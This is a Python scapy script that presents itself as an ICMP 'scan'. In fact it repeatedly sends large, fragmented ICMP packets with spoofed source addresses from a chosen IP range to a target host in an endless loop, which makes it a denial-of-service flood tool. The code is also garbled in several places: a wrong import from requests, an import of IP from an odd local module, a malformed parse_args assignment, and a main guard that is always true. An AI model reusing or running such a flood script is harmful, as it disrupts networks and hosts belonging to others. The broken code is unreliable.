#-*- coding:utf-8 -*-
#python3
from requests import options
from scapy.all import *
import optparse

from scapy.layers.inet import fragment, ICMP

from 网络安全常见模块.socket.socket连接源代码.socket单向发送.tc import IP


def icmpscan(host,dhost,datas):
	datass='A'*int(datas)
	packet=IP(src=host,dst=dhost)/ICMP()/datass
	send(fragment(packet))

def scanhost(dhost,rhost,datas): 
	while 1:
		for i in range(1,254):
			host="%s%s"%(rhost,i)
			icmpscan(host,dhost,datas)
		
def main():
	parser = optparse.OptionParser('usage%prog '+'-R <Flase IP Range:192.168.0.> '+'-D <packet size> '+'-H <target Host> ')
	parser.add_option('-H',dest = 'dhost', type='string',help='Specify target host -指定目标主机')
	parser.add_option('-R',dest = 'rhost', type='string',help='Specify range host  -指定范围内的主机')
	parser.add_option('-D',dest = 'datas', type='string',help='packet size  -数据包大小')
	(options.args)=parser.parse_args()
	dhost=options.dhost
	rhost=options.rhost
	datas=options.datas
	if dhost == None:
		print(parser.usage)
		exit(0)
	scanhost(dhost,rhost,datas)
if '__name__ == __main__':
	main()
